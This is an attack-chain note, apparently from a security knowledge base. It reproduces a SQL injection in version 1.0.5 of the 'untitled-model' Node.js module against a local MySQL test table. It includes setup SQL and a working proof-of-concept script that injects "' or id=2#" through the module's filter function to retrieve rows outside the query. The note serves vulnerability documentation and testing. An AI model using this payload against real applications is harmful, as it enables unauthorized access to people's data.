---
tags:
  - sqli
  - node.js
  - mysql
  - data-leakage
  - vulnerability-exploit
type: attack_chain
tools:
  - '[[tools/yarn]]'
  - '[[tools/Node.js]]'
  - '[[tools/MySQL]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/yarn-add-untitled-model]]'
  - '[[commands/create-user-table-mysql]]'
  - '[[commands/insert-test-data-user-table]]'
  - '[[commands/run-nodejs-sqli-poc-script]]'
platforms:
  - Node.js
  - Linux
  - macOS
complexity: medium
procedures:
  - '[[procedures/Install-Vulnerable-untitled-model-Module]]'
  - '[[procedures/Setup-Test-MySQL-Database]]'
  - '[[procedures/Exploit-SQL-Injection-in-Filter-Function]]'
step_count: 3
techniques:
  - '[[Exploit Public-Facing Application]]'
description: >-
  Demonstrates SQL injection vulnerability in the untitled-model Node.js module,
  allowing unauthorized data extraction from MySQL databases via unsanitized
  filter inputs.
skill_level: intermediate
impact_level: high
id: 17458818-4ad7-44ad-b556-a2e35fd36ac5
created_at: '2025-12-14T03:46:15.042Z'
updated_at: '2025-12-14T03:46:15.042Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# SQL-Injection-in-untitled-model-Node.js-Module-for-Data-Leakage

The untitled-model Node.js module (version 1.0.5) suffers from SQL injection vulnerabilities due to direct concatenation of unescaped user inputs into SQL queries. This attack chain reproduces the vulnerability using a proof-of-concept script, enabling attackers to bypass filters and extract sensitive data from a MySQL database. The chain assumes a development or testing environment where the module is integrated into a Node.js application interacting with MySQL.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Install Vulnerable Module] --> B[Setup Test Database]
    B --> C[Exploit SQL Injection]
    C --> D[Data Leakage Achieved]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/yarn]]
- [[tools/Node.js]]
- [[tools/MySQL]]

### Target Environment

- Node.js runtime (version 8.12.0 or compatible)
- MySQL database server (version 5.7 or later, running on localhost with root user and empty password for testing)
- Access to a Node.js project directory

### Initial Access Requirements

- Local machine with Node.js and MySQL installed
- No network access beyond localhost required for POC
- Administrative privileges on the test database

## Detailed Attack Procedures

### Step 1: Install Vulnerable Module
procedure: [[procedures/Install-Vulnerable-untitled-model-Module]]

**Objective**: Add the vulnerable untitled-model package to a Node.js project to enable exploitation testing.

**Instructions**: Use [[commands/yarn-add-untitled-model]] to install the module from npm:

```bash
yarn add untitled-model
```

**Expected Output**: Package installation logs, with untitled-model@1.0.5 added to package.json dependencies.

**Success Indicators**:
- Module listed in node_modules
- No installation errors

### Step 2: Setup Test Database
procedure: [[procedures/Setup-Test-MySQL-Database]]

**Objective**: Create a MySQL database and populate it with sample data to demonstrate normal vs. injected query results.

**Instructions**: First, create the user table using [[commands/create-user-table-mysql]]:

```sql
CREATE TABLE `user` ( `id` int(11) NOT NULL, `firstName` varchar(255) NOT NULL, `lastName` varchar(255) NOT NULL, `age` int(11) NOT NULL ) ENGINE=InnoDB DEFAULT CHARSET=latin1;
```

Then insert test data with [[commands/insert-test-data-user-table]]:

```sql
INSERT INTO `user` (`id`, `firstName`, `lastName`, `age`) VALUES (1, 'Timber', 'Saw', 25), (2, 'Timber 0', 'Saw', 25);
```

**Expected Output**: Table created and two rows inserted successfully.

**Success Indicators**:
- Table exists in the 'test' database
- Query SELECT * FROM user returns the two sample rows

### Step 3: Exploit SQL Injection
procedure: [[procedures/Exploit-SQL-Injection-in-Filter-Function]]

**Objective**: Execute a proof-of-concept script to inject malicious SQL payload into the module's filter function, bypassing filters to leak unauthorized data.

**Instructions**: Run the Node.js POC script using [[commands/run-nodejs-sqli-poc-script]]:

```javascript
var model = require('untitled-model'); model.connection({ host:"localhost", user:"root", password:"", database:"test" }); var User = model.get('user'); (async()=>{ await new Promise((resolve,reject)=>{ User.filter({'id':1},function(err,data){ if(err)throw err; console.log('normal query', data); resolve(); }); }); await new Promise((resolve,reject)=>{ User.filter({'id':"' or id=2#"},function(err,data){ if(err)throw err; console.log('sqli query', data); resolve(); }); }); process.exit(0); })();
```

Save this as a .js file and execute with `node script.js`.

**Expected Output**: Normal query returns data for id=1, SQLi query returns data for id=2, demonstrating bypass.

**Success Indicators**:
- Normal query: [ {id:1, firstName:'Timber', lastName:'Saw', age:25} ]
- SQLi query: [ {id:2, firstName:'Timber 0', lastName:'Saw', age:25} ]
- No errors in execution

## Attack Chain Summary

### Key Achievements

1. Successful installation and setup of vulnerable environment
2. Reproduction of SQL injection to bypass id filter
3. Unauthorized extraction of database records

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]

### MITRE ATT&CK Tactics

- [[Initial Access]]

---
*Last updated: 2023-10-01T00:00:00Z*
